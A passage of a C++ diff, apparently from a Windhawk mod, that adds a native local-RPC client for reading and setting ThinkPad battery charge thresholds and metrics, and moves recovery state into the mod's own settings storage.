+    0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x23, 0x00, 0x30, 0x00, 0x30, 0x40, 0x00, 0x00,
+    0x00, 0x00, 0x2c, 0x00, 0x6c, 0x00, 0x40, 0x06, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x12, 0x00, 0x48, 0x00, 0x08, 0x00,
+    0x08, 0x00, 0x50, 0x21, 0x10, 0x00, 0x06, 0x00, 0x50, 0x21, 0x18, 0x00, 0x06, 0x00,
+    0x50, 0x21, 0x20, 0x00, 0x08, 0x00, 0x50, 0x21, 0x28, 0x00, 0x08, 0x00,
+};
+const unsigned char procResetState[] = {
+    0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x24, 0x00, 0x20, 0x00, 0x30, 0x40, 0x00, 0x00,
+    0x00, 0x00, 0x24, 0x00, 0x54, 0x00, 0x40, 0x04, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x12, 0x00, 0x50, 0x21, 0x08, 0x00,
+    0x08, 0x00, 0x50, 0x21, 0x10, 0x00, 0x08, 0x00, 0x50, 0x21, 0x18, 0x00, 0x08, 0x00,
+};
+const unsigned char procStartReset[] = {
+    0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x26, 0x00, 0x10, 0x00, 0x30, 0x40, 0x00, 0x00, 0x00,
+    0x00, 0x2c, 0x00, 0x00, 0x00, 0x40, 0x02, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x12, 0x00, 0x48, 0x00, 0x08, 0x00, 0x08, 0x00,
+};
+const unsigned char procStopReset[] = {
+    0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x27, 0x00, 0x10, 0x00, 0x30, 0x40, 0x00, 0x00, 0x00,
+    0x00, 0x2c, 0x00, 0x00, 0x00, 0x40, 0x02, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x12, 0x00, 0x48, 0x00, 0x08, 0x00, 0x08, 0x00,
+};
+const unsigned char procSetThreshold[] = {
+    0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x28, 0x00, 0x20, 0x00, 0x30, 0x40, 0x00, 0x00,
+    0x00, 0x00, 0x3c, 0x00, 0x00, 0x00, 0x40, 0x04, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x12, 0x00, 0x48, 0x00, 0x08, 0x00,
+    0x08, 0x00, 0x48, 0x00, 0x10, 0x00, 0x08, 0x00, 0x48, 0x00, 0x18, 0x00, 0x08, 0x00,
+};
+const unsigned char procFullCapacity[] = {
+    0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x29, 0x00, 0x20, 0x00, 0x30, 0x40, 0x00, 0x00,
+    0x00, 0x00, 0x2c, 0x00, 0x36, 0x00, 0x40, 0x04, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x12, 0x00, 0x48, 0x00, 0x08, 0x00,
+    0x08, 0x00, 0x50, 0x21, 0x10, 0x00, 0x08, 0x00, 0x50, 0x21, 0x18, 0x00, 0x06, 0x00,
+};
+const unsigned char procDesignCapacity[] = {
+    0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x2a, 0x00, 0x20, 0x00, 0x30, 0x40, 0x00, 0x00,
+    0x00, 0x00, 0x2c, 0x00, 0x36, 0x00, 0x40, 0x04, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x12, 0x00, 0x48, 0x00, 0x08, 0x00,
+    0x08, 0x00, 0x50, 0x21, 0x10, 0x00, 0x08, 0x00, 0x50, 0x21, 0x18, 0x00, 0x06, 0x00,
+};
+const unsigned char procDesignVoltage[] = {
+    0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x2b, 0x00, 0x20, 0x00, 0x30, 0x40, 0x00, 0x00,
+    0x00, 0x00, 0x2c, 0x00, 0x36, 0x00, 0x40, 0x04, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x12, 0x00, 0x48, 0x00, 0x08, 0x00,
+    0x08, 0x00, 0x50, 0x21, 0x10, 0x00, 0x08, 0x00, 0x50, 0x21, 0x18, 0x00, 0x06, 0x00,
+};
+const unsigned char procAdapterWatts[] = {
+    0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x2d, 0x00, 0x20, 0x00, 0x30, 0x40, 0x00, 0x00,
+    0x00, 0x00, 0x2c, 0x00, 0x36, 0x00, 0x40, 0x04, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x12, 0x00, 0x48, 0x00, 0x08, 0x00,
+    0x08, 0x00, 0x50, 0x21, 0x10, 0x00, 0x08, 0x00, 0x50, 0x21, 0x18, 0x00, 0x06, 0x00,
+};
+const unsigned char procVoltage[] = {
+    0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x2e, 0x00, 0x20, 0x00, 0x30, 0x40, 0x00, 0x00,
+    0x00, 0x00, 0x2c, 0x00, 0x36, 0x00, 0x40, 0x04, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x12, 0x00, 0x48, 0x00, 0x08, 0x00,
+    0x08, 0x00, 0x50, 0x21, 0x10, 0x00, 0x08, 0x00, 0x50, 0x21, 0x18, 0x00, 0x06, 0x00,
+};
+const unsigned char procCurrent[] = {
+    0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x2f, 0x00, 0x20, 0x00, 0x30, 0x40, 0x00, 0x00,
+    0x00, 0x00, 0x2c, 0x00, 0x36, 0x00, 0x40, 0x04, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x12, 0x00, 0x48, 0x00, 0x08, 0x00,
+    0x08, 0x00, 0x50, 0x21, 0x10, 0x00, 0x08, 0x00, 0x50, 0x21, 0x18, 0x00, 0x06, 0x00,
+};
+const unsigned char procTemperature[] = {
+    0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x30, 0x00, 0x20, 0x00, 0x30, 0x40, 0x00, 0x00,
+    0x00, 0x00, 0x2c, 0x00, 0x36, 0x00, 0x40, 0x04, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x12, 0x00, 0x48, 0x00, 0x08, 0x00,
+    0x08, 0x00, 0x50, 0x21, 0x10, 0x00, 0x08, 0x00, 0x50, 0x21, 0x18, 0x00, 0x06, 0x00,
+};
+const unsigned char procCycles[] = {
+    0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x31, 0x00, 0x20, 0x00, 0x30, 0x40, 0x00, 0x00,
+    0x00, 0x00, 0x2c, 0x00, 0x36, 0x00, 0x40, 0x04, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x12, 0x00, 0x48, 0x00, 0x08, 0x00,
+    0x08, 0x00, 0x50, 0x21, 0x10, 0x00, 0x08, 0x00, 0x50, 0x21, 0x18, 0x00, 0x06, 0x00,
+};
+const unsigned char procPercent[] = {
+    0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x32, 0x00, 0x20, 0x00, 0x30, 0x40, 0x00, 0x00,
+    0x00, 0x00, 0x2c, 0x00, 0x36, 0x00, 0x40, 0x04, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x12, 0x00, 0x48, 0x00, 0x08, 0x00,
+    0x08, 0x00, 0x50, 0x21, 0x10, 0x00, 0x08, 0x00, 0x50, 0x21, 0x18, 0x00, 0x06, 0x00,
+};
+const unsigned char procRemaining[] = {
+    0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x33, 0x00, 0x20, 0x00, 0x30, 0x40, 0x00, 0x00,
+    0x00, 0x00, 0x2c, 0x00, 0x36, 0x00, 0x40, 0x04, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x12, 0x00, 0x48, 0x00, 0x08, 0x00,
+    0x08, 0x00, 0x50, 0x21, 0x10, 0x00, 0x08, 0x00, 0x50, 0x21, 0x18, 0x00, 0x06, 0x00,
+};
+const unsigned char procRemainingTime[] = {
+    0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x20, 0x00, 0x30, 0x40, 0x00, 0x00,
+    0x00, 0x00, 0x2c, 0x00, 0x36, 0x00, 0x40, 0x04, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x12, 0x00, 0x48, 0x00, 0x08, 0x00,
+    0x08, 0x00, 0x50, 0x21, 0x10, 0x00, 0x08, 0x00, 0x50, 0x21, 0x18, 0x00, 0x06, 0x00,
+};
+const unsigned char procCompletionTime[] = {
+    0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x35, 0x00, 0x20, 0x00, 0x30, 0x40, 0x00, 0x00,
+    0x00, 0x00, 0x2c, 0x00, 0x36, 0x00, 0x40, 0x04, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x12, 0x00, 0x48, 0x00, 0x08, 0x00,
+    0x08, 0x00, 0x50, 0x21, 0x10, 0x00, 0x08, 0x00, 0x50, 0x21, 0x18, 0x00, 0x06, 0x00,
+};
+const unsigned char procChargeStatus[] = {
+    0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x36, 0x00, 0x20, 0x00, 0x30, 0x40, 0x00, 0x00,
+    0x00, 0x00, 0x2c, 0x00, 0x36, 0x00, 0x40, 0x04, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x12, 0x00, 0x48, 0x00, 0x08, 0x00,
+    0x08, 0x00, 0x50, 0x21, 0x10, 0x00, 0x08, 0x00, 0x50, 0x21, 0x18, 0x00, 0x06, 0x00,
+};
+const unsigned char procChemistry[] = {
+    0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x37, 0x00, 0x20, 0x00, 0x30, 0x40, 0x00, 0x00,
+    0x00, 0x00, 0x2c, 0x00, 0x36, 0x00, 0x40, 0x04, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x12, 0x00, 0x48, 0x00, 0x08, 0x00,
+    0x08, 0x00, 0x50, 0x21, 0x10, 0x00, 0x08, 0x00, 0x50, 0x21, 0x18, 0x00, 0x06, 0x00,
+};
+const unsigned char procHealth[] = {
+    0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x38, 0x00, 0x20, 0x00, 0x30, 0x40, 0x00, 0x00,
+    0x00, 0x00, 0x2c, 0x00, 0x36, 0x00, 0x40, 0x04, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x12, 0x00, 0x48, 0x00, 0x08, 0x00,
+    0x08, 0x00, 0x50, 0x21, 0x10, 0x00, 0x08, 0x00, 0x50, 0x21, 0x18, 0x00, 0x06, 0x00,
+};
+const RPC_CLIENT_INTERFACE client = {
+    sizeof(RPC_CLIENT_INTERFACE),
+    {{0xaf8abfc6, 0x2132, 0x4870, {0xbf, 0x8d, 0xbc, 0xa5, 0x41, 0xff, 0xcf, 0x0b}}, {1, 0}},
+    {{0x8a885d04, 0x1ceb, 0x11c9, {0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60}}, {2, 0}},
+    nullptr,
+    0,
+    nullptr,
+    0,
+    nullptr,
+    0};
+void* __RPC_USER Allocate(size_t size) {
+  return malloc(size);
+}
+void __RPC_USER Free(void* p) {
+  free(p);
+}
+RPC_BINDING_HANDLE autoBinding = nullptr;
+const MIDL_STUB_DESC stub = {const_cast<RPC_CLIENT_INTERFACE*>(&client),
+                             Allocate,
+                             Free,
+                             {&autoBinding},
+                             nullptr,
+                             nullptr,
+                             nullptr,
+                             nullptr,
+                             types,
+                             1,
+                             0x50002,
+                             nullptr,
+                             0x8010274,
+                             nullptr,
+                             nullptr,
+                             nullptr,
+                             1,
+                             nullptr,
+                             nullptr,
+                             nullptr};
+// These tiny SEH boundaries contain only plain data, never C++ objects with destructors.
+DWORD Open(RPC_BINDING_HANDLE binding, void** context) noexcept {
+  __try {
+    NdrClientCall2(&stub, const_cast<unsigned char*>(procOpen), binding, context);
+    return 0;
+  } __except (EXCEPTION_EXECUTE_HANDLER) {
+    return GetExceptionCode();
+  }
+}
+void Close(void** context) noexcept {
+  __try {
+    NdrClientCall2(&stub, const_cast<unsigned char*>(procClose), context);
+  } __except (EXCEPTION_EXECUTE_HANDLER) {
+    RpcSmDestroyClientContext(context);
+  }
+}
+struct Battery {
+  short capable = 0, enabled = 0;
+  long start = 0, stop = 0;
+};
+DWORD Read(void* context, long battery, Battery* result) noexcept {
+  __try {
+    NdrClientCall2(&stub, const_cast<unsigned char*>(procQuery), context, battery, &result->capable,
+                   &result->enabled, &result->start, &result->stop);
+    return 0;
+  } __except (EXCEPTION_EXECUTE_HANDLER) {
+    return GetExceptionCode();
+  }
+}
+DWORD Write(void* context, long battery, long start, long stop) noexcept {
+  __try {
+    NdrClientCall2(&stub, const_cast<unsigned char*>(procSetThreshold), context, battery, start,
+                   stop);
+    return 0;
+  } __except (EXCEPTION_EXECUTE_HANDLER) {
+    return GetExceptionCode();
+  }
+}
+struct Session {
+  RPC_BINDING_HANDLE binding = nullptr;
+  void* context = nullptr;
+  ~Session() { Reset(); }
+  void Reset() noexcept {
+    if (context)
+      Close(&context);
+    context = nullptr;
+    if (binding)
+      RpcBindingFree(&binding);
+  }
+  Session() = default;
+  Session(const Session&) = delete;
+  Session& operator=(const Session&) = delete;
+  DWORD Connect(ULONGLONG deadline) {
+    DWORD error = RPC_S_SERVER_UNAVAILABLE;
+    for (int i = 0; i < 10 && GetTickCount64() < deadline; i++) {
+      wchar_t endpoint[64];
+      swprintf_s(endpoint, L"BaseModuleRpcEndpoint_%d", i);
+      RPC_WSTR text = nullptr;
+      error = RpcStringBindingComposeW(
+          nullptr, reinterpret_cast<RPC_WSTR>(const_cast<wchar_t*>(L"ncalrpc")), nullptr,
+          reinterpret_cast<RPC_WSTR>(endpoint), nullptr, &text);
+      if (!error)
+        error = RpcBindingFromStringBindingW(text, &binding);
+      if (text)
+        RpcStringFreeW(&text);
+      if (!error)
+        error = RpcBindingSetOption(binding, RPC_C_OPT_CALL_TIMEOUT, 1000);
+      if (!error)
+        error = Open(binding, &context);
+      if (!error && context)
+        return 0;
+      if (!error)
+        error = RPC_X_SS_CONTEXT_MISMATCH;
+      Reset();
+      // Never try another endpoint after access denial or an unexpected protocol fault.
+      if (error != RPC_S_SERVER_UNAVAILABLE && error != RPC_S_UNKNOWN_IF &&
+          error != EPT_S_NOT_REGISTERED)
+        break;
+    }
+    return error;
+  }
+};
+
+// Advanced calls use fixed, generated signatures. No caller-controlled operation numbers.
+DWORD ShortRead(void* ctx, const unsigned char* proc, short* value) noexcept {
+  __try {
+    NdrClientCall2(&stub, const_cast<unsigned char*>(proc), ctx, value);
+    return 0;
+  } __except (EXCEPTION_EXECUTE_HANDLER) {
+    return GetExceptionCode();
+  }
+}
+DWORD LongRead(void* ctx, const unsigned char* proc, long* value) noexcept {
+  __try {
+    NdrClientCall2(&stub, const_cast<unsigned char*>(proc), ctx, value);
+    return 0;
+  } __except (EXCEPTION_EXECUTE_HANDLER) {
+    return GetExceptionCode();
+  }
+}
+DWORD MetricRead(void* ctx,
+                 const unsigned char* proc,
+                 long slot,
+                 long* value,
+                 short* capable) noexcept {
+  __try {
+    NdrClientCall2(&stub, const_cast<unsigned char*>(proc), ctx, slot, value, capable);
+    return 0;
+  } __except (EXCEPTION_EXECUTE_HANDLER) {
+    return GetExceptionCode();
+  }
+}
+DWORD ResetCapability(void* ctx, long slot, short* capable) noexcept {
+  __try {
+    NdrClientCall2(&stub, const_cast<unsigned char*>(procResetCap), ctx, capable, slot);
+    return 0;
+  } __except (EXCEPTION_EXECUTE_HANDLER) {
+    return GetExceptionCode();
+  }
+}
+DWORD CalibrationState(void* ctx, long* battery, long* stage, long* stages) noexcept {
+  __try {
+    NdrClientCall2(&stub, const_cast<unsigned char*>(procResetState), ctx, battery, stage, stages);
+    return 0;
+  } __except (EXCEPTION_EXECUTE_HANDLER) {
+    return GetExceptionCode();
+  }
+}
+DWORD ShortWrite(void* ctx, const unsigned char* proc, short value) noexcept {
+  __try {
+    NdrClientCall2(&stub, const_cast<unsigned char*>(proc), ctx, value);
+    return 0;
+  } __except (EXCEPTION_EXECUTE_HANDLER) {
+    return GetExceptionCode();
+  }
+}
+DWORD LongWrite(void* ctx, const unsigned char* proc, long value) noexcept {
+  __try {
+    NdrClientCall2(&stub, const_cast<unsigned char*>(proc), ctx, value);
+    return 0;
+  } __except (EXCEPTION_EXECUTE_HANDLER) {
+    return GetExceptionCode();
+  }
+}
+struct Metric {
+  bool available = false;
+  long value = 0;
+};
+struct AdvancedBattery {
+  bool present = false, resetCapable = false;
+  Metric full, design, temperature, cycles, percent, voltage, adapter;
+};
+struct Advanced {
+  bool connected = false, usbSupported = false, airplaneSupported = false, coolingSupported = false;
+  long usb = 0;
+  short airplane = 0, cooling = 0;
+  bool resetKnown = false;
+  long resetBattery = 0, resetStage = 0, resetStages = 0;
+  AdvancedBattery batteries[2];
+};
+Advanced ReadAdvanced(ULONGLONG deadline) {
+  Advanced a;
+  Session session;
+  if (session.Connect(deadline))
+    return a;
+  a.connected = true;
+  auto boolean = [&](const unsigned char* cap, const unsigned char* getter, short& value) {
+    short supported = 0;
+    return GetTickCount64() < deadline && !ShortRead(session.context, cap, &supported) &&
+           supported == 1 && !ShortRead(session.context, getter, &value) &&
+           (value == 0 || value == 1);
+  };
+  short usb = 0;
+  a.usbSupported = GetTickCount64() < deadline && !ShortRead(session.context, procUsbCap, &usb) &&
+                   usb == 1 && !LongRead(session.context, procUsbValue, &a.usb) && a.usb >= 0 &&
+                   a.usb <= 2;
+  a.airplaneSupported = boolean(procAirplaneCap, procAirplaneValue, a.airplane);
+  a.coolingSupported = boolean(procCoolingCap, procCoolingValue, a.cooling);
+  a.resetKnown =
+      GetTickCount64() < deadline &&
+      !CalibrationState(session.context, &a.resetBattery, &a.resetStage, &a.resetStages) &&
+      a.resetBattery >= 0 && a.resetBattery <= 2 && a.resetStage >= 0 && a.resetStages >= 0 &&
+      a.resetStage <= a.resetStages;
+  for (long slot = 1; slot <= 2 && GetTickCount64() < deadline; slot++) {
+    auto& b = a.batteries[slot - 1];
+    Battery thresholds;
+    b.present = !Read(session.context, slot, &thresholds) && thresholds.capable == 1;
+    if (!b.present)
+      continue;
+    short reset = 0;
+    b.resetCapable = !ResetCapability(session.context, slot, &reset) && reset == 1;
+    auto metric = [&](const unsigned char* proc, long min, long max) {
+      Metric v;
+      short cap = 0;
+      v.available = GetTickCount64() < deadline &&
+                    !MetricRead(session.context, proc, slot, &v.value, &cap) && cap == 1 &&
+                    v.value >= min && v.value <= max;
+      return v;
+    };
+    b.full = metric(procFullCapacity, 1, 1000000);
+    b.design = metric(procDesignCapacity, 1, 1000000);
+    b.temperature = metric(procTemperature, -40, 120);
+    b.cycles = metric(procCycles, 0, 100000);
+    b.percent = metric(procPercent, 0, 100);
+    b.voltage = metric(procVoltage, 1, 100000);
+    b.adapter = metric(procAdapterWatts, 1, 1000);
+  }
+  return a;
+}
+// Implements the utility's documented status/off/on STOP [START] command contract.
+// Both battery slots are enumerated, just as in the utility. The app's Parse gate
+// retains both battery slots before any UI-originated write.
+bool Run(const std::wstring& command, std::string& output, ULONGLONG deadline, DWORD& error) {
+  error = ERROR_INVALID_PARAMETER;
+  std::wistringstream input(command);
+  std::wstring verb, extra;
+  input >> verb;
+  bool setting = false;
+  int start = 0, stop = 0;
+  if (verb == L"on") {
+    setting = true;
+    if (!(input >> stop))
+      return false;
+    if (input >> start) {
+    } else {
+      if (!input.eof())
+        return false;
+      input.clear();
+      start = stop - 5;
+    }
+    if (start < 5 || start >= stop || stop > 100)
+      return false;
+  } else if (verb == L"off")
+    setting = true;
+  else if (verb != L"status")
+    return false;
+  if (input >> extra)
+    return false;
+  if (GetTickCount64() >= deadline) {
+    error = ERROR_TIMEOUT;
+    return false;
+  }
+  Session session;
+  error = session.Connect(deadline);
+  if (error)
+    return false;
+  Battery batteries[2];
+  int count = 0;
+  for (long i = 0; i < 2; i++) {
+    if (GetTickCount64() >= deadline) {
+      error = ERROR_TIMEOUT;
+      return false;
+    }
+    error = Read(session.context, i + 1, &batteries[i]);
+    if (error)
+      return false;
+    auto& b = batteries[i];
+    if ((b.capable != 0 && b.capable != 1) || (b.enabled != 0 && b.enabled != 1) ||
+        (b.capable && b.enabled && (b.start < 5 || b.start >= b.stop || b.stop > 100))) {
+      error = ERROR_INVALID_DATA;
+      return false;
+    }
+    if (b.capable)
+      count++;
+  }
+  if (!count) {
+    error = ERROR_NOT_SUPPORTED;
+    return false;
+  }
+  for (long i = 0; i < 2; i++) {
+    auto& b = batteries[i];
+    if (!b.capable)
+      continue;
+    if (setting) {
+      if (GetTickCount64() >= deadline) {
+        error = ERROR_TIMEOUT;
+        return false;
+      }
+      error = Write(session.context, i + 1, start, stop);
+      if (error)
+        return false;
+      // Verify the service accepted the requested state, including off.
+      Battery actual;
+      error = Read(session.context, i + 1, &actual);
+      if (error)
+        return false;
+      if (actual.capable != 1 || actual.enabled != (verb == L"on" ? 1 : 0) ||
+          (actual.enabled && (actual.start != start || actual.stop != stop))) {
+        error = ERROR_WRITE_FAULT;
+        return false;
+      }
+    } else {
+      output += "Charge threshold for Battery #" + std::to_string(i + 1) + ": ";
+      output += b.enabled ? "Start at " + std::to_string(b.start) + "%, Stop at " +
+                                std::to_string(b.stop) + "%.\n"
+                          : "OFF.\n";
+    }
+  }
+  return true;
+}
+}  // namespace NativeRpc
+
+// Snapshot the setting once per operation so a settings change cannot split a write/readback.
+bool IntegratedBackend() {
+  return std::wstring(WindhawkUtils::StringSetting::make(L"backend").get()) != L"executable";
+}
+bool RunSelected(bool integrated, const std::wstring& args, std::string& output) {
+  if (!integrated)
+    return Run(args, output);
+  auto shutdown = shutdownDeadline.load();
+  if ((shutdown && GetTickCount64() >= shutdown) ||
+      (!shutdown && WaitForSingleObject(stopEvent, 0) == WAIT_OBJECT_0))
+    return false;
+  DWORD error = 0;
+  bool ok = NativeRpc::Run(args, output, shutdown ? shutdown : GetTickCount64() + 5000, error);
+  Wh_Log(L"nativeRpcError=%d", int(error));
+  SetUtility(ok ? 5 : 6);
+  return ok;
+}
+State QueryWith(bool integrated) {
   std::string output;
-  if (!Run(L"status", output))
+  if (!RunSelected(integrated, L"status", output))
     return {};
   return Parse(output);
+}
+State Query() {
+  return QueryWith(IntegratedBackend());
 }
 bool Set(State target) {
   if (target.enabled && !ValidRange(target.start, target.stop))
     return false;
+  bool integrated = IntegratedBackend();
+  State before = QueryWith(integrated);
+  if (!before.valid)
+    return false;
   std::string output;
-  Run(target.enabled ? L"on " + std::to_wstring(target.stop) + L" " + std::to_wstring(target.start)
+  bool accepted = RunSelected(
+      integrated,
+      target.enabled ? L"on " + std::to_wstring(target.stop) + L" " + std::to_wstring(target.start)
                      : L"off",
       output);
-  State actual = Query();
-  return actual.valid && actual.enabled == target.enabled &&
-         (!target.enabled || (actual.start == target.start && actual.stop == target.stop));
+  State actual = QueryWith(integrated);
+  if (!accepted || !actual.valid)
+    return false;
+  for (int i = 0; i < 2; i++) {
+    auto& p = actual.packs[i];
+    if (p.present != before.packs[i].present ||
+        (p.present && (bool(p.enabled) != target.enabled ||
+                       (target.enabled && (p.start != target.start || p.stop != target.stop)))))
+      return false;
+  }
+  return true;
 }
-constexpr PCWSTR recoveryKey = L"Software\\BillBauman\\ThinkPadBatteryControls";
-bool OpenRecovery(HKEY& key) {
-  Handle token;
-  DWORD bytes = 0;
-  if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, token.out()))
+bool RestorePack(int slot, const Pack& target) {
+  NativeRpc::Session session;
+  auto deadline = shutdownDeadline.load();
+  if (!deadline)
+    deadline = GetTickCount64() + 5000;
+  if (session.Connect(deadline))
     return false;
-  GetTokenInformation(token, TokenUser, nullptr, 0, &bytes);
-  std::vector<BYTE> buffer(bytes);
-  if (!GetTokenInformation(token, TokenUser, buffer.data(), bytes, &bytes))
+  NativeRpc::Battery current;
+  if (NativeRpc::Read(session.context, slot, &current) || current.capable != 1)
     return false;
-  LPWSTR sid = nullptr;
-  if (!ConvertSidToStringSidW(reinterpret_cast<TOKEN_USER*>(buffer.data())->User.Sid, &sid))
+  // Recheck Vantage precedence immediately before the write.
+  if (current.enabled == 1)
+    return true;
+  if (current.enabled != 0 || !target.enabled || GetTickCount64() >= deadline)
     return false;
-  std::wstring sddl = L"D:P(A;;KA;;;SY)(A;;KA;;;BA)(A;;KA;;;" + std::wstring(sid) + L")";
-  LocalFree(sid);
-  PSECURITY_DESCRIPTOR sd = nullptr;
-  if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(sddl.c_str(), SDDL_REVISION_1, &sd,
-                                                            nullptr))
+  if (NativeRpc::Write(session.context, slot, target.start, target.stop))
     return false;
-  SECURITY_ATTRIBUTES sa{sizeof(sa), sd, FALSE};
-  DWORD disposition;
-  auto rc = RegCreateKeyExW(HKEY_CURRENT_USER, recoveryKey, 0, nullptr, 0, KEY_READ | KEY_WRITE,
-                            &sa, &key, &disposition);
-  LocalFree(sd);
-  return rc == ERROR_SUCCESS;
+  NativeRpc::Battery actual;
+  return !NativeRpc::Read(session.context, slot, &actual) && actual.capable == 1 &&
+         actual.enabled == 1 && actual.start == target.start && actual.stop == target.stop;
 }
 bool Save(const Recovery& value) {
-  if (!ValidRecovery(value, Now()))
+  if (!ValidRecovery(value, Now()) || (!Wh_SetIntValue(L"RecoveryPresent", 1) ||
+                                       !Wh_SetBinaryValue(L"Recovery", &value, sizeof(value))))
     return false;
-  DATA_BLOB input{sizeof(value), reinterpret_cast<BYTE*>(const_cast<Recovery*>(&value))}, output{};
-  if (!CryptProtectData(&input, L"ThinkPad Battery Controls recovery", nullptr, nullptr, nullptr,
-                        CRYPTPROTECT_UI_FORBIDDEN, &output))
-    return false;
-  HKEY key = nullptr;
-  bool ok = OpenRecovery(key);
-  if (ok) {
-    ok = RegSetValueExW(key, L"Recovery", 0, REG_BINARY, output.pbData, output.cbData) ==
-         ERROR_SUCCESS;
-    RegCloseKey(key);
-  }
-  LocalFree(output.pbData);
-  if (ok) {
-    recovery = value;
-    active = value.active != 0;
-  }
-  return ok;
+  recovery = value;
+  active = value.active != 0;
+  return true;
 }
 void Load() {
-  HKEY key = nullptr;
-  if (!OpenRecovery(key)) {
-    recoveryInvalid = true;
-    return;
-  }
-  BYTE buffer[4096];
-  DWORD bytes = sizeof(buffer), type = 0;
-  auto rc = RegQueryValueExW(key, L"Recovery", nullptr, &type, buffer, &bytes);
-  RegCloseKey(key);
-  if (rc == ERROR_FILE_NOT_FOUND) {
-    // Do not import unauthenticated legacy state. Surface it for manual recovery.
-    return;  // Shared diagnostic keys are never trusted as recovery input.
-  }
-  DATA_BLOB input{bytes, buffer}, output{};
-  if (rc != ERROR_SUCCESS || type != REG_BINARY ||
-      !CryptUnprotectData(&input, nullptr, nullptr, nullptr, nullptr, CRYPTPROTECT_UI_FORBIDDEN,
-                          &output)) {
-    recoveryInvalid = true;
-    return;
-  }
   Recovery candidate{};
-  bool ok = output.cbData == sizeof(candidate);
-  if (ok)
-    memcpy(&candidate, output.pbData, sizeof(candidate));
-  LocalFree(output.pbData);
-  if (!ok || !ValidRecovery(candidate, Now())) {
+  auto bytes = Wh_GetBinaryValue(L"Recovery", &candidate, sizeof(candidate));
+  if (!bytes) {
+    recoveryInvalid = Wh_GetIntValue(L"RecoveryPresent", 0) != 0;
+    return;
+  }
+  if (bytes != sizeof(candidate) || !ValidRecovery(candidate, Now())) {
     recoveryInvalid = true;
     return;
   }
@@ -639,19 +1105,42 @@ bool Clear() {
   recoveryInvalid = false;
   return true;
 }
-// BEGIN TESTABLE RESTORE
 bool Restore() {
-  if (recoveryInvalid || !ValidRecovery(recovery, Now())) {
-    Status(L"Recovery data invalid. Apply your desired limits manually.");
+  if (recoveryInvalid || !ValidRecovery(recovery, Now()))
     return false;
-  }
   if (!Active())
     return true;
   State current = Query();
   if (!current.valid)
     return false;
-  if (!current.enabled && !Set({true, true, int(recovery.start), int(recovery.stop)}))
-    return false;
+  bool needed = false;
+  for (int i = 0; i < 2; i++) {
+    if (current.packs[i].present != recovery.prior[i].present)
+      return false;
